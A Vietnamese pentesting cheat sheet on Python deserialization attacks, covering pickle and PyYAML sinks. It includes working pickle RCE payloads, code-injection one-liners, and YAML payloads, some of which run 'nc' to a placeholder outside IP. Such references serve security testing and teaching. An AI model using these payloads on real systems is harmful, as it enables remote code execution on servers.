# Python Deserialization

> Python deserialization là quá trình tái tạo các Python object từ dữ liệu đã được serialized, thường được thực hiện bằng các định dạng như JSON, pickle hoặc YAML. Module `pickle` là một công cụ thường được sử dụng cho mục đích này trong Python vì nó có thể serialize và deserialize các Python object phức tạp, bao gồm cả custom class.

## Tóm tắt

* [Công cụ](#công-cụ)
* [Phương pháp](#phương-pháp)

  * [Pickle](#pickle)
  * [PyYAML](#pyyaml)
* [Tài liệu tham khảo](#tài-liệu-tham-khảo)

## Công cụ

* https://github.com/j0lt-github/python-deserialization-attack-payload-generator - Serialized payload cho tấn công RCE thông qua deserialization trên các ứng dụng sử dụng Python, nơi module `pickle`, `PyYAML`, `ruamel.yaml` hoặc `jsonpickle` được sử dụng để deserialize dữ liệu đã được serialized.

## Phương pháp

Trong source code Python, tìm kiếm các sink sau:

* `cPickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`

### Pickle

Đoạn code sau là một ví dụ đơn giản về việc sử dụng `cPickle` để tạo một `auth_token`, là một serialized `User` object.

:warning: `import cPickle` chỉ hoạt động trên Python 2.

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

Lỗ hổng xuất hiện khi một token được load từ dữ liệu đầu vào do người dùng cung cấp.

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Tài liệu Python 2.7 nêu rõ rằng Pickle không bao giờ nên được sử dụng với các nguồn không đáng tin cậy. Hãy tạo dữ liệu độc hại có khả năng thực thi arbitrary code trên server.

> Module `pickle` không an toàn trước dữ liệu được tạo sai hoặc có mục đích độc hại. Không bao giờ unpickle dữ liệu nhận được từ một nguồn không đáng tin cậy hoặc chưa được xác thực.

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

Một universal payload có thể được tạo bằng cách load `os` tại runtime thông qua `eval`:

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        return eval, ("__import__('os').system('whoami')",)
pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled).decode())
```

Cách tiếp cận này cho phép chạy arbitrary Python code, từ đó có thể sử dụng các kỹ thuật khác nhau từ code injection:

```python
__import__('os').system('whoami') # Reflected RCE
getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE
```

### PyYAML

YAML deserialization là quá trình chuyển đổi dữ liệu có định dạng YAML trở lại thành các object trong những ngôn ngữ lập trình như Python, Ruby hoặc Java. YAML (YAML Ain't Markup Language) phổ biến trong các file cấu hình và serialization dữ liệu vì nó dễ đọc đối với con người và hỗ trợ các cấu trúc dữ liệu phức tạp.

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

Kể từ PyYAML phiên bản 6.0, default loader của `load` đã được chuyển sang `SafeLoader`, giúp giảm thiểu rủi ro Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)

Các sink dễ bị tổn thương hiện nay là `yaml.unsafe_load` và `yaml.load(input, Loader=yaml.UnsafeLoader)`.

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

## Tài liệu tham khảo

* [CVE-2019-20477 - 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://web.archive.org/web/20250501184227/https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
* [Exploiting misuse of Python's "pickle" - Nelson Elhage - March 20, 2011](https://web.archive.org/web/20260211161939/https://blog.nelhage.com/2011/03/exploiting-pickle/)
* [Python Yaml Deserialization - HackTricks - July 19, 2024](https://web.archive.org/web/20241216145404/https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
* [PyYAML Documentation - PyYAML - April 29, 2006](https://web.archive.org/web/20260219140302/https://pyyaml.org/wiki/PyYAMLDocumentation)
* [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://web.archive.org/web/20250604032318/https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
